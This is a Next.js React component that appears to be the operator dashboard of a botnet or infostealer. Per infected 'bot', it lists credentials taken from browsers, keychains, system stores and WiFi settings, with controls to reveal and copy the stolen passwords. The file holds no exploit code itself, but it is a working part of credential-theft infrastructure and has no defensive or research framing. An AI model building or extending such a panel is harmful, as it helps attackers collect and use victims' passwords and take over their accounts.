"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import {
  ArrowLeft,
  Copy,
  Eye,
  EyeOff,
  Key,
  Shield,
  Globe,
  Lock,
  Wifi,
} from "lucide-react";
import { toast } from "sonner";

import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";

const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8080";

type CredentialType = {
  id: string;
  service: string;
  url?: string;
  username: string;
  passwordValue: string; // From backend
  capturedAt: string;
  type: "browser" | "system" | "wifi" | "other";
};

interface BotCredentialsClientProps {
  botId: string;
}

export default function BotCredentialsClient({
  botId,
}: BotCredentialsClientProps) {
  const [credentials, setCredentials] = useState<CredentialType[]>([]);
  const [loading, setLoading] = useState(true);
  const [revealed, setRevealed] = useState<Set<string>>(new Set());

  useEffect(() => {
    const fetchCredentials = async () => {
      try {
        setLoading(true);
        const response = await fetch(`${API_URL}/api/credentials/${botId}`);
        if (!response.ok) throw new Error("Failed to fetch credentials");
        const data = await response.json();

        // Map data if needed (the backend already returns passwordValue)
        const mapped: CredentialType[] = data.map((item: CredentialType) => ({
          ...item,
          // Infer type from service name or tags if available, default to browser for now
          type: item.service?.toLowerCase().includes("wifi")
            ? "wifi"
            : item.service?.toLowerCase().includes("system")
              ? "system"
              : "browser",
        }));

        setCredentials(mapped);
      } catch (error) {
        console.error("Error fetching credentials:", error);
        toast.error("Failed to load credentials for this bot");
      } finally {
        setLoading(false);
      }
    };

    fetchCredentials();
  }, [botId]);

  const toggleReveal = (id: string) => {
    setRevealed((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied to clipboard");
  };

  const getServiceBadge = (type: CredentialType["type"]) => {
    switch (type) {
      case "browser":
        return (
          <Badge
            variant="secondary"
            className="bg-blue-100 text-blue-700 dark:bg-blue-900/30 dark:text-blue-300 hover:bg-blue-100 dark:hover:bg-blue-900/30"
          >
            <Globe className="mr-1 h-3 w-3" /> Browser
          </Badge>
        );
      case "system":
        return (
          <Badge
            variant="secondary"
            className="bg-red-100 text-red-700 dark:bg-red-900/30 dark:text-red-300 hover:bg-red-100 dark:hover:bg-red-900/30"
          >
            <Shield className="mr-1 h-3 w-3" /> System
          </Badge>
        );
      case "wifi":
        return (
          <Badge
            variant="secondary"
            className="bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-300 hover:bg-amber-100 dark:hover:bg-amber-900/30"
          >
            <Wifi className="mr-1 h-3 w-3" /> WiFi
          </Badge>
        );
      default:
        return (
          <Badge variant="outline">
            <Lock className="mr-1 h-3 w-3" /> Other
          </Badge>
        );
    }
  };

  return (
    <div className="container mx-auto p-6 max-w-6xl space-y-6">
      <div className="flex flex-col gap-2">
        <Link
          href="/"
          className="text-sm text-muted-foreground hover:text-foreground flex items-center gap-1 transition-colors w-fit"
        >
          <ArrowLeft className="h-4 w-4" />
          Back to Dashboard
        </Link>
        <div className="flex flex-col gap-1 mt-2">
          <h1 className="text-3xl font-bold tracking-tight text-foreground">
            Extracted Credentials
          </h1>
          <p className="text-muted-foreground">
            Secrets recovered from{" "}
            <span className="font-mono bg-muted px-1.5 py-0.5 rounded text-foreground text-xs">
              {botId}
            </span>
          </p>
        </div>
      </div>

      <Card className="shadow-sm">
        <CardHeader className="pb-4">
          <CardTitle className="text-xl flex items-center gap-2">
            <Key className="h-5 w-5 text-primary" />
            Vault Contents
          </CardTitle>
          <CardDescription>
            Confidential data retrieved from local storage, keychains, and
            browser caches.
          </CardDescription>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="flex flex-col items-center justify-center py-20 gap-4">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
              <p className="text-sm text-muted-foreground">
                Scanning the vault...
              </p>
            </div>
          ) : (
            <div className="rounded-md border">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-[200px]">Service</TableHead>
                    <TableHead className="w-[250px]">Username</TableHead>
                    <TableHead className="min-w-[200px]">Password</TableHead>
                    <TableHead className="w-[180px]">Captured At</TableHead>
                    <TableHead className="w-[100px] text-right">
                      Actions
                    </TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {credentials.length > 0 ? (
                    credentials.map((cred) => (
                      <TableRow key={cred.id}>
                        <TableCell className="font-medium">
                          <div className="flex flex-col gap-1 items-start">
                            <span className="font-semibold">
                              {cred.service}
                            </span>
                            {getServiceBadge(cred.type)}
                            {cred.url && (
                              <span
                                className="text-[10px] text-muted-foreground truncate max-w-[180px]"
                                title={cred.url}
                              >
                                {cred.url}
                              </span>
                            )}
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <span className="font-mono text-sm bg-muted/50 px-2 py-1 rounded select-all">
                              {cred.username || "N/A"}
                            </span>
                            <Button
                              variant="ghost"
                              size="icon"
                              className="h-6 w-6 text-muted-foreground hover:text-foreground"
                              onClick={() =>
                                copyToClipboard(cred.username || "")
                              }
                              title="Copy Username"
                            >
                              <Copy className="h-3 w-3" />
                            </Button>
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <div className="font-mono text-sm bg-muted/50 px-2 py-1 rounded min-w-[140px] flex items-center">
                              {revealed.has(cred.id) ? (
                                <span className="text-foreground">
                                  {cred.passwordValue}
                                </span>
                              ) : (
                                <span className="text-muted-foreground tracking-widest">
                                  • • • • • • • •
                                </span>
                              )}
                            </div>
                            <Button
                              variant="ghost"
                              size="icon"
                              className="h-6 w-6 text-muted-foreground hover:text-foreground"
                              onClick={() => toggleReveal(cred.id)}
                              title={
                                revealed.has(cred.id)
                                  ? "Hide Password"
                                  : "Show Password"
                              }
                            >
                              {revealed.has(cred.id) ? (
                                <EyeOff className="h-3 w-3" />
                              ) : (
                                <Eye className="h-3 w-3" />
                              )}
                            </Button>
                          </div>
                        </TableCell>
                        <TableCell className="text-sm text-muted-foreground">
                          {new Date(cred.capturedAt).toLocaleDateString()}{" "}
                          <span className="text-xs opacity-70">
                            {new Date(cred.capturedAt).toLocaleTimeString([], {
                              hour: "2-digit",
                              minute: "2-digit",
                            })}
                          </span>
                        </TableCell>
                        <TableCell className="text-right">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => copyToClipboard(cred.passwordValue)}
                          >
                            <Copy className="h-3.5 w-3.5 mr-2" />
                            Copy
                          </Button>
                        </TableCell>
                      </TableRow>
                    ))
                  ) : (
                    <TableRow>
                      <TableCell
                        colSpan={5}
                        className="h-32 text-center text-muted-foreground"
                      >
                        No credentials retrieved from this agent yet.
                      </TableCell>
                    </TableRow>
                  )}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
